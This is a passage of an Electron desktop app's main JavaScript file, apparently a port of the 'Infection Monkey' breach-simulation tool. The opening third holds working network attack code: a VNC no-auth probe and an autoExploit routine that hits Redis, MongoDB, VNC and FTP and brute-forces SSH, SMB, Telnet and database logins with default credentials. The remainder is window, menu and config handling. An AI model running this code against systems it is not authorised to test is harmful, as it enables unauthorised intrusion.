            socket.on('connect', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', host, info: 'PostgreSQL port open, install psql for exploitation' }); });
            socket.on('error', (e) => { callback({ success: false, method: 'PostgreSQL', error: e.message }); });
            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', error: 'Timeout' }); });
            socket.connect(5432, host);
        }
    });
}

// VNC no-auth check
function attemptVNCExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = Buffer.alloc(0);

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response = Buffer.concat([response, data]);
        const str = response.toString();

        if (str.startsWith('RFB')) {
            // VNC handshake - respond with same version
            const version = str.substring(0, 12);
            socket.write(version);

            setTimeout(() => {
                // Check security type
                if (response.length > 12) {
                    const secTypes = response.slice(12);
                    // Security type 1 = None (no auth)
                    if (secTypes.includes(1)) {
                        socket.destroy();
                        callback({ success: true, method: 'VNC-NoAuth', host, info: `VNC no authentication required (${version.trim()})` });
                        return;
                    }
                }
                socket.destroy();
                callback({ success: false, method: 'VNC', host, info: `VNC requires auth (${version.trim()})` });
            }, 1500);
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'VNC', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'VNC', error: err.message }); });
    socket.connect(5900, host);
}

// ===== AUTO-EXPLOIT: Tries everything against a host =====
function autoExploit(host, openPorts, userCredentials, callback) {
    const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
    const allCreds = [...userCredentials, ...DEFAULT_CREDENTIALS];
    const results = [];
    let pending = 0;
    let bestResult = null;

    function checkDone() {
        pending--;
        if (pending <= 0) {
            // Return the best result (first successful one, or summary of all attempts)
            const success = results.find(r => r.success);
            callback({
                success: !!success,
                method: success ? success.method : 'None',
                host,
                bestResult: success || null,
                allResults: results,
                info: success ? `Exploited via ${success.method} (${success.username || 'no-auth'})` : `All ${results.length} exploitation attempts failed`,
                username: success ? success.username : null,
                sysInfo: success ? success.sysInfo : null
            });
        }
    }

    // No-auth exploits (don't need credentials)
    if (portSet.has(6379)) {
        pending++;
        attemptRedisExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
    }
    if (portSet.has(27017)) {
        pending++;
        attemptMongoExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
    }
    if (portSet.has(5900)) {
        pending++;
        attemptVNCExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
    }

    // FTP anonymous
    if (portSet.has(21)) {
        pending++;
        attemptFTPExploit(host, 'anonymous', 'anonymous@', (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
    }

    // Credential-based exploits - try each credential pair
    const credExploits = [];

    // Limit brute-force to first 10 unique credential pairs to avoid excessive time
    const uniqueCreds = [];
    const seen = new Set();
    for (const c of allCreds) {
        const key = `${c.username}:${c.password}`;
        if (!seen.has(key)) {
            seen.add(key);
            uniqueCreds.push(c);
            if (uniqueCreds.length >= 15) break;
        }
    }

    for (const cred of uniqueCreds) {
        if (portSet.has(22)) {
            credExploits.push({ fn: attemptSSHExploit, port: 22, ...cred });
        }
        if (portSet.has(445)) {
            credExploits.push({ fn: attemptSMBExploit, port: 445, ...cred });
        }
        if (portSet.has(21)) {
            credExploits.push({ fn: attemptFTPExploit, port: 21, ...cred });
        }
        if (portSet.has(23)) {
            credExploits.push({ fn: attemptTelnetExploit, port: 23, ...cred });
        }
        if (portSet.has(3306)) {
            credExploits.push({ fn: attemptMySQLExploit, port: 3306, ...cred });
        }
        if (portSet.has(5432)) {
            credExploits.push({ fn: attemptPostgresExploit, port: 5432, ...cred });
        }
    }

    // Run credential exploits in batches (3 concurrent)
    let credIndex = 0;
    const BATCH_SIZE = 3;
    let credPending = credExploits.length;
    pending += credPending;

    if (credPending === 0 && pending === 0) {
        callback({
            success: false, method: 'None', host,
            allResults: results,
            info: 'No exploitable ports found'
        });
        return;
    }

    function runNextCredBatch() {
        while (credIndex < credExploits.length) {
            const batch = credExploits.slice(credIndex, credIndex + BATCH_SIZE);
            credIndex += BATCH_SIZE;
            batch.forEach(exploit => {
                exploit.fn(host, exploit.username, exploit.password, (r) => {
                    results.push(r);
                    if (r.success && !bestResult) bestResult = r;
                    checkDone();
                    // If we found success, no need to continue more batches
                    if (!bestResult) {
                        runNextCredBatch();
                    }
                });
            });
            break; // Only start one batch, next batch triggered by callback
        }
    }

    if (credExploits.length > 0) {
        runNextCredBatch();
    }
}

// No separate Next.js server needed - static files served by the combined app server

function createWindow(port) {
    const apiPort = port; // API and static files served on same port

    mainWindow = new BrowserWindow({
        width: 1400,
        height: 900,
        minWidth: 1024,
        minHeight: 700,
        title: 'Infection Monkey - Security Testing Platform',
        icon: path.join(__dirname, 'icon.png'),
        backgroundColor: '#0A0E17',
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        },
        autoHideMenuBar: false,
        show: false
    });

    const menuTemplate = [
        {
            label: 'File',
            submenu: [
                {
                    label: 'New Simulation',
                    accelerator: 'CmdOrCtrl+N',
                    click: () => mainWindow.webContents.executeJavaScript("window.location.href = '/run'")
                },
                { type: 'separator' },
                {
                    label: 'Export Configuration',
                    accelerator: 'CmdOrCtrl+E',
                    click: () => exportConfiguration()
                },
                {
                    label: 'Import Configuration',
                    accelerator: 'CmdOrCtrl+I',
                    click: () => importConfiguration()
                },
                { type: 'separator' },
                { role: 'quit' }
            ]
        },
        {
            label: 'View',
            submenu: [
                { label: 'Dashboard', accelerator: 'CmdOrCtrl+1', click: () => navigateTo('/dashboard') },
                { label: 'Configure', accelerator: 'CmdOrCtrl+2', click: () => navigateTo('/configure') },
                { label: 'Run Simulation', accelerator: 'CmdOrCtrl+3', click: () => navigateTo('/run') },
                { label: 'Network Map', accelerator: 'CmdOrCtrl+4', click: () => navigateTo('/network-map') },
                { label: 'Reports', accelerator: 'CmdOrCtrl+5', click: () => navigateTo('/report') },
                { type: 'separator' },
                { role: 'reload' },
                { role: 'forceReload' },
                { role: 'toggleDevTools' },
                { type: 'separator' },
                { role: 'zoomIn' },
                { role: 'zoomOut' },
                { role: 'resetZoom' },
                { type: 'separator' },
                { role: 'togglefullscreen' }
            ]
        },
        {
            label: 'Simulation',
            submenu: [
                { label: 'Start Simulation', accelerator: 'F5', click: () => navigateTo('/run') },
                { label: 'View Events', click: () => navigateTo('/events') },
                { type: 'separator' },
                { label: 'Plugins', click: () => navigateTo('/plugins/available') }
            ]
        },
        {
            label: 'Help',
            submenu: [
                { label: 'Documentation', click: () => shell.openExternal('https://techdocs.akamai.com/infection-monkey/docs/') },
                { label: 'GitHub Repository', click: () => shell.openExternal('https://github.com/guardicore/monkey') },
                { type: 'separator' },
                { label: 'About Infection Monkey', click: () => navigateTo('/about') }
            ]
        }
    ];

    function navigateTo(p) {
        mainWindow.webContents.executeJavaScript(`window.location.href = '${p}'`);
    }

    Menu.setApplicationMenu(Menu.buildFromTemplate(menuTemplate));

    // Inject desktop app configuration on page load
    mainWindow.webContents.on('did-finish-load', () => {
        mainWindow.webContents.executeJavaScript(`
            window.__MONKEY_DESKTOP__ = true;
            window.__MONKEY_API_PORT__ = ${apiPort};
        `).catch(() => {});
    });

    // Retry loading URL until the server is ready
    const loadWithRetry = (url, retries = 10) => {
        mainWindow.loadURL(url).catch((err) => {
            console.error(`Failed to load ${url}:`, err.message);
            if (retries > 0) {
                setTimeout(() => loadWithRetry(url, retries - 1), 2000);
            } else {
                // After all retries, show error page
                mainWindow.loadURL(`data:text/html,<html><body style="background:#0A0E17;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center"><h1>Startup Error</h1><p>Could not connect to internal server.</p><p>Please restart the application.</p></div></body></html>`);
            }
        });
    };

    loadWithRetry(`http://127.0.0.1:${port}`);

    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
    });

    mainWindow.on('closed', () => {
        mainWindow = null;
    });
}

async function exportConfiguration() {
    const result = await dialog.showSaveDialog(mainWindow, {
        title: 'Export Configuration',
        defaultPath: 'monkey-config.json',
        filters: [{ name: 'JSON Files', extensions: ['json'] }]
    });
    if (!result.canceled) {
        mainWindow.webContents.executeJavaScript(`
            (function() {
                const keys = ['monkey_config', 'monkey_simulation', 'monkey_events', 'monkey_settings'];
                const data = {};
                keys.forEach(k => {
                    try { data[k] = JSON.parse(localStorage.getItem(k)); } catch(e) {}
                });
                return JSON.stringify(data, null, 2);
            })()
        `).then(json => {
            fs.writeFileSync(result.filePath, json);
        }).catch(() => {});
    }
}

async function importConfiguration() {
    const result = await dialog.showOpenDialog(mainWindow, {
        title: 'Import Configuration',
        filters: [{ name: 'JSON Files', extensions: ['json'] }],
        properties: ['openFile']
    });
    if (!result.canceled && result.filePaths.length > 0) {
        try {
            const content = fs.readFileSync(result.filePaths[0], 'utf8');
            const data = JSON.parse(content);
            mainWindow.webContents.executeJavaScript(`
                (function() {
                    const data = ${JSON.stringify(data)};
                    Object.entries(data).forEach(([k, v]) => {
                        if (v) localStorage.setItem(k, JSON.stringify(v));
                    });
                    window.location.reload();
                })()
            `);
        } catch (e) {
            dialog.showErrorBox('Import Error', 'Failed to import configuration file.');
        }
    }
}

function createSplashWindow() {
    const splash = new BrowserWindow({
        width: 500,
        height: 350,
        frame: false,
        transparent: true,
        resizable: false,
        center: true,
        webPreferences: { nodeIntegration: false, contextIsolation: true }
    });

    splash.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(`
<!DOCTYPE html>
<html>
<head>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: 'Segoe UI', -apple-system, sans-serif;
        background: #0A0E17;
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        border-radius: 16px;
        border: 1px solid rgba(255,255,255,0.1);
        overflow: hidden;
    }
    .logo {
        font-size: 36px;
        font-weight: 800;
        background: linear-gradient(135deg, #00E676, #7C4DFF);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 8px;
    }
    .subtitle { color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 40px; }
    .loader { width: 200px; height: 3px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 16px; }
    .loader-bar { height: 100%; width: 40%; background: linear-gradient(90deg, #00E676, #7C4DFF); border-radius: 3px; animation: loading 1.5s ease-in-out infinite; }
    @keyframes loading { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
    .status { color: rgba(255,255,255,0.4); font-size: 12px; }
    .version { position: absolute; bottom: 16px; color: rgba(255,255,255,0.3); font-size: 11px; }
</style>
</head>
<body>
    <div style="font-size:48px;margin-bottom:16px;">&#x1F412;</div>
    <div class="logo">Infection Monkey</div>
    <div class="subtitle">Security Testing Platform</div>
    <div class="loader"><div class="loader-bar"></div></div>
    <div class="status">Starting application...</div>
    <div class="version">v2.3.0</div>
</body>
</html>
    `)}`);

    return splash;
}

// IPC handlers
ipcMain.handle('get-network-info', () => getNetworkInfo());
ipcMain.handle('get-system-info', () => ({
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    uptime: os.uptime()
}));

app.whenReady().then(async () => {
    const splash = createSplashWindow();

    try {
        // Find an available port for the combined server (API + static files)
        const appPort = await findAvailablePort(17812);
        console.log(`Using port: ${appPort}`);
        console.log(`Static dir: ${getStaticDir()}`);
        console.log(`Static dir exists: ${fs.existsSync(getStaticDir())}`);

        // Start the combined server (serves both API and static files)
        const appServer = createAppServer();
        await new Promise((resolve, reject) => {
            appServer.on('error', (err) => {
                console.error('Server error:', err);
                reject(err);
            });
            appServer.listen(appPort, '127.0.0.1', () => {
                console.log(`App server running on port ${appPort}`);
                resolve();
            });
        });
        global.apiServer = appServer;

        createWindow(appPort);
        splash.close();
    } catch (err) {
        console.error('Failed to start:', err);
        splash.close();
        dialog.showErrorBox(
            'Startup Error',
            `Failed to start Infection Monkey.\n\nError: ${err.message}\n\nPlease try restarting the application.`
        );
        app.quit();
    }
});

app.on('window-all-closed', () => {
    if (global.apiServer) global.apiServer.close();
    app.quit();
});

app.on('before-quit', () => {
    if (global.apiServer) global.apiServer.close();
});
